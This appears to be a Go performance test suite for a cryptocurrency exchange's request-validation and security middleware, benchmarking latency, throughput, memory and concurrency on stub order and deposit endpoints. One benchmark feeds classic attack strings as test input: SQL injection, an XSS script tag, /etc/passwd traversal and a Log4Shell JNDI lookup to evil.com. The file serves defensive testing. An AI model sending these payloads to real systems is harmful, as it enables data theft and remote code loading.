package test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"runtime"
	"sync"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"

	"pincex_unified/pkg/validation"
)

// PerformanceTestSuite contains performance-focused validation tests
type PerformanceTestSuite struct {
	router     *gin.Engine
	logger     *zap.Logger
	baseRouter *gin.Engine // Router without validation for comparison
	metrics    *PerformanceMetrics
}

// PerformanceMetrics tracks performance data
type PerformanceMetrics struct {
	RequestCount       int64
	TotalDuration      time.Duration
	MinDuration        time.Duration
	MaxDuration        time.Duration
	AvgDuration        time.Duration
	P95Duration        time.Duration
	P99Duration        time.Duration
	ErrorCount         int64
	ValidationOverhead time.Duration
	MemoryUsage        runtime.MemStats
	ConcurrentRequests int
	ThroughputQPS      float64
}

// Setup initializes the performance test suite
func (suite *PerformanceTestSuite) Setup() {
	gin.SetMode(gin.TestMode)
	suite.logger = zap.NewNop()
	suite.metrics = &PerformanceMetrics{
		MinDuration: time.Hour, // Initialize to high value
	}

	// Setup router with validation
	suite.router = gin.New()
	config := validation.DefaultEnhancedValidationConfig()
	config.EnablePerformanceLogging = true
	config.StrictModeEnabled = true

	suite.router.Use(validation.EnhancedValidationMiddleware(suite.logger, config))
	securityConfig := validation.DefaultSecurityConfig()
	suite.router.Use(validation.SecurityHardeningMiddleware(suite.logger, securityConfig))

	// Setup base router without validation for comparison
	suite.baseRouter = gin.New()

	// Add test endpoints to both routers
	suite.setupEndpoints(suite.router)
	suite.setupEndpoints(suite.baseRouter)
}

// setupEndpoints adds test endpoints to a router
func (suite *PerformanceTestSuite) setupEndpoints(r *gin.Engine) {
	api := r.Group("/api/v1")

	trading := api.Group("/trading")
	{
		trading.POST("/orders", func(c *gin.Context) {
			// Simulate minimal processing
			time.Sleep(100 * time.Microsecond)
			c.JSON(http.StatusOK, gin.H{"status": "order_created"})
		})
		trading.GET("/orders", func(c *gin.Context) {
			time.Sleep(50 * time.Microsecond)
			c.JSON(http.StatusOK, gin.H{"orders": []string{}})
		})
		trading.GET("/orderbook/:symbol", func(c *gin.Context) {
			time.Sleep(75 * time.Microsecond)
			c.JSON(http.StatusOK, gin.H{"orderbook": gin.H{}})
		})
	}

	api.GET("/market/prices", func(c *gin.Context) {
		time.Sleep(30 * time.Microsecond)
		c.JSON(http.StatusOK, gin.H{"prices": gin.H{}})
	})

	api.POST("/fiat/deposit", func(c *gin.Context) {
		time.Sleep(200 * time.Microsecond)
		c.JSON(http.StatusOK, gin.H{"status": "deposit_initiated"})
	})
}

// BenchmarkValidationOverhead measures validation overhead
func BenchmarkValidationOverhead(b *testing.B) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	// Benchmark without validation
	b.Run("WithoutValidation", func(b *testing.B) {
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer valid_token")

			w := httptest.NewRecorder()
			suite.baseRouter.ServeHTTP(w, req)
		}
	})

	// Benchmark with validation
	b.Run("WithValidation", func(b *testing.B) {
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer valid_token")

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)
		}
	})
}

// BenchmarkConcurrentValidation tests validation under concurrent load
func BenchmarkConcurrentValidation(b *testing.B) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	concurrencyLevels := []int{1, 10, 50, 100, 500}

	for _, concurrency := range concurrencyLevels {
		b.Run(fmt.Sprintf("Concurrency_%d", concurrency), func(b *testing.B) {
			b.SetParallelism(concurrency)
			b.RunParallel(func(pb *testing.PB) {
				for pb.Next() {
					req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
					req.Header.Set("Content-Type", "application/json")
					req.Header.Set("Authorization", "Bearer valid_token")

					w := httptest.NewRecorder()
					suite.router.ServeHTTP(w, req)
				}
			})
		})
	}
}

// BenchmarkSecurityValidation tests security validation performance
func BenchmarkSecurityValidation(b *testing.B) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	// Test with various threat patterns
	threats := []string{
		"'; DROP TABLE orders; --",
		"<script>alert('xss')</script>",
		"../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"||' UNION SELECT password FROM users--",
	}

	for _, threat := range threats {
		b.Run(fmt.Sprintf("Threat_%s", threat[:min(10, len(threat))]), func(b *testing.B) {
			payload := map[string]interface{}{
				"symbol":   threat,
				"side":     "buy",
				"type":     "limit",
				"quantity": "0.1",
				"price":    "50000.00",
			}
			jsonPayload, _ := json.Marshal(payload)

			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer valid_token")

				w := httptest.NewRecorder()
				suite.router.ServeHTTP(w, req)
			}
		})
	}
}

// TestValidationLatency measures end-to-end validation latency
func TestValidationLatency(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	testCases := []struct {
		name       string
		method     string
		path       string
		payload    map[string]interface{}
		maxLatency time.Duration
	}{
		{
			name:   "Trading Order Creation",
			method: "POST",
			path:   "/api/v1/trading/orders",
			payload: map[string]interface{}{
				"symbol":   "BTC/USD",
				"side":     "buy",
				"type":     "limit",
				"quantity": "0.1",
				"price":    "50000.00",
			},
			maxLatency: 5 * time.Millisecond,
		},
		{
			name:       "Order Retrieval",
			method:     "GET",
			path:       "/api/v1/trading/orders",
			maxLatency: 2 * time.Millisecond,
		},
		{
			name:       "Market Prices",
			method:     "GET",
			path:       "/api/v1/market/prices",
			maxLatency: 1 * time.Millisecond,
		},
		{
			name:   "Fiat Deposit",
			method: "POST",
			path:   "/api/v1/fiat/deposit",
			payload: map[string]interface{}{
				"amount":          "1000.00",
				"currency":        "USD",
				"payment_method":  "bank_transfer",
				"bank_account_id": "550e8400-e29b-41d4-a716-446655440000",
			},
			maxLatency: 7 * time.Millisecond,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var req *http.Request

			if tc.payload != nil {
				jsonPayload, _ := json.Marshal(tc.payload)
				req = httptest.NewRequest(tc.method, tc.path, bytes.NewBuffer(jsonPayload))
				req.Header.Set("Content-Type", "application/json")
			} else {
				req = httptest.NewRequest(tc.method, tc.path, nil)
			}
			req.Header.Set("Authorization", "Bearer valid_token")

			// Measure multiple iterations
			iterations := 100
			var totalDuration time.Duration

			for i := 0; i < iterations; i++ {
				start := time.Now()
				w := httptest.NewRecorder()
				suite.router.ServeHTTP(w, req)
				duration := time.Since(start)
				totalDuration += duration
			}

			avgLatency := totalDuration / time.Duration(iterations)
			t.Logf("Average validation latency for %s: %v", tc.name, avgLatency)

			assert.Less(t, avgLatency, tc.maxLatency,
				"Validation latency should be under %v, got %v", tc.maxLatency, avgLatency)
		})
	}
}

// TestMemoryUsage tests memory consumption during validation
func TestMemoryUsage(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	// Force garbage collection
	runtime.GC()
	runtime.GC()

	var memBefore runtime.MemStats
	runtime.ReadMemStats(&memBefore)

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	// Perform many validation operations
	iterations := 10000
	for i := 0; i < iterations; i++ {
		req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer valid_token")

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)
	}

	// Force garbage collection
	runtime.GC()
	runtime.GC()

	var memAfter runtime.MemStats
	runtime.ReadMemStats(&memAfter)

	memoryIncrease := memAfter.Alloc - memBefore.Alloc
	memoryPerRequest := float64(memoryIncrease) / float64(iterations)

	t.Logf("Memory usage per validation: %.2f bytes", memoryPerRequest)
	t.Logf("Total memory increase: %d bytes", memoryIncrease)

	// Memory per request should be reasonable (less than 1KB)
	assert.Less(t, memoryPerRequest, 1024.0, "Memory usage per validation should be under 1KB")
}

// TestThroughput measures validation throughput
func TestThroughput(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	duration := 5 * time.Second
	var requestCount int64
	var errors int64

	start := time.Now()
	end := start.Add(duration)

	// Run concurrent requests for specified duration
	concurrency := 50
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(end) {
				req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer valid_token")

				w := httptest.NewRecorder()
				suite.router.ServeHTTP(w, req)

				if w.Code != http.StatusOK {
					errors++
				}
				requestCount++
			}
		}()
	}

	wg.Wait()
	actualDuration := time.Since(start)

	qps := float64(requestCount) / actualDuration.Seconds()
	errorRate := float64(errors) / float64(requestCount) * 100

	t.Logf("Throughput: %.2f QPS", qps)
	t.Logf("Error rate: %.2f%%", errorRate)
	t.Logf("Total requests: %d", requestCount)
	t.Logf("Duration: %v", actualDuration)

	// Validation should handle at least 1000 QPS
	assert.Greater(t, qps, 1000.0, "Validation throughput should be at least 1000 QPS")
	assert.Less(t, errorRate, 1.0, "Error rate should be less than 1%")
}

// TestConcurrentSafety tests thread safety of validation
func TestConcurrentSafety(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	concurrency := 100
	iterations := 1000
	var wg sync.WaitGroup
	errors := make(chan error, concurrency*iterations)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(goroutineID int) {
			defer wg.Done()
			for j := 0; j < iterations; j++ {
				req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer valid_token")
				req.Header.Set("X-Request-ID", fmt.Sprintf("g%d-r%d", goroutineID, j))

				w := httptest.NewRecorder()
				suite.router.ServeHTTP(w, req)

				if w.Code != http.StatusOK {
					errors <- fmt.Errorf("goroutine %d, iteration %d: unexpected status %d",
						goroutineID, j, w.Code)
				}
			}
		}(i)
	}

	wg.Wait()
	close(errors)

	var errorCount int
	for err := range errors {
		t.Logf("Concurrent error: %v", err)
		errorCount++
	}

	assert.Equal(t, 0, errorCount, "No errors should occur during concurrent validation")
}

// TestValidationCaching tests if validation patterns are cached properly
func TestValidationCaching(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	// First request (pattern compilation)
	start := time.Now()
	req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer valid_token")

	w := httptest.NewRecorder()
	suite.router.ServeHTTP(w, req)
	firstDuration := time.Since(start)

	// Subsequent requests (should use cached patterns)
	var totalSubsequentDuration time.Duration
	iterations := 100

	for i := 0; i < iterations; i++ {
		start = time.Now()
		req = httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer valid_token")

		w = httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)
		totalSubsequentDuration += time.Since(start)
	}

	avgSubsequentDuration := totalSubsequentDuration / time.Duration(iterations)

	t.Logf("First request duration: %v", firstDuration)
	t.Logf("Average subsequent duration: %v", avgSubsequentDuration)

	// Subsequent requests should be faster (caching effect)
	// Allow for some variance but expect improvement
	assert.Less(t, avgSubsequentDuration, firstDuration*110/100,
		"Subsequent requests should benefit from caching")
}

// TestResourceCleanup tests that validation doesn't leak resources
func TestResourceCleanup(t *testing.T) {
	suite := &PerformanceTestSuite{}
	suite.Setup()

	// Monitor goroutines before test
	initialGoroutines := runtime.NumGoroutine()

	payload := map[string]interface{}{
		"symbol":   "BTC/USD",
		"side":     "buy",
		"type":     "limit",
		"quantity": "0.1",
		"price":    "50000.00",
	}
	jsonPayload, _ := json.Marshal(payload)

	// Perform many validation operations
	iterations := 5000
	for i := 0; i < iterations; i++ {
		req := httptest.NewRequest(http.MethodPost, "/api/v1/trading/orders", bytes.NewBuffer(jsonPayload))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer valid_token")

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)
	}

	// Force garbage collection
	runtime.GC()
	runtime.GC()
	time.Sleep(100 * time.Millisecond) // Allow cleanup

	finalGoroutines := runtime.NumGoroutine()

	t.Logf("Initial goroutines: %d", initialGoroutines)
	t.Logf("Final goroutines: %d", finalGoroutines)

	// Should not leak goroutines
	assert.LessOrEqual(t, finalGoroutines, initialGoroutines+5,
		"Should not leak significant number of goroutines")
}

// min helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
